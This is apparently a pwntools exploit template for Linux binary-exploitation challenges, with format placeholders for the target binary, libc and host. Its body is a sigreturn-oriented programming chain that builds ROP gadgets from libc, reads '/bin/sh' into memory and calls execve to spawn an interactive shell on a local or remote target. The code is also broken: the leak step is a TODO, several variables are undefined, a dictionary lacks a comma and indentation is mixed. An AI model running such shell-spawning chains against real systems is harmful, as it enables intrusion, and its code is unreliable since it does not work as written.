#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: {author} - {blog}
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import os, sys

# CONFIG
# ---------------------------------------------------------------------------
BIN_PATH   = {file_path!r}
LIBC_PATH  = {libc_path!r}
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], {host!r}, {port!r})

ctx = Context(
    arch      = {arch!r},
    os        = {os!r},
    endian    = {endian!r},
    log_level = {log!r},
    terminal  = {term!r}
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {{}}
).init().alias()
set_global_io(io)	# s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# EXPLOIT
# ---------------------------------------------------------------------------
def xpl(**kwargs):
   
    # TODO: exploit chain




	# After leaking libc_base
	libc.address = libc_base

	ggs 	= ROPGadgets(libc)
	p_rdi_r = ggs['p_rdi_r']
	p_rsi_r = ggs['p_rsi_r']
	p_rax_r = ggs['p_rax_r']
	p_rsp_r = ggs['p_rsp_r']
	p_rdx_rbx_r = ggs['p_rdx_rbx_r']
	leave_r = ggs['leave_r']
	ret 	= ggs['ret']

	system = libc.sym.system
	binsh  = next(libc.search(b'/bin/sh\x00'))


	buf = 0xdeadbeef

    # - 1st sigFrame: read '/bin/sh\x00' into buf
	sigFrame = SigreturnFrame()
	sigFrame.rax = 0		# read()
	sigFrame.rdi = 0
    #sigFrame.rbp = buf+0x20	
    #sigFrame.rsp = buf
	sigFrame.rsi = buf		# buf
	sigFrame.rdx = 0x200	# size
	sigFrame.rip = syscall_r

	pl = b""

	pl += flat({
		0x0 : p_rax_syscall_r,	# ret
		0x8 : 15,	# rt_sigreturn
		0x10: p_rdi_r,
		0x18: 0,	# read fd
		0x20: syscall_r,
		0x28: sigFrame,
	}, filler=b'\0')

    # - 2nd sigFrame: system('/bin/sh\x00')
	sigFrame = SigreturnFrame()
	sigFrame.rax = 59	# execve()
	sigFrame.rdi = buf
	sigFrame.rsi = 0x0
	sigFrame.rdx = 0x0
	sigFrame.rip = syscall_r

	pl += flat({
		0x0:  p_rax_syscall_r,
		0x8:  15,	
		0x10: syscall_r
		0x18: sigFrame,
	}, filler=b'\0')

	pl += b'/bin/sh\x00'



    io.interactive()

# PIPELINE
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    xpl()

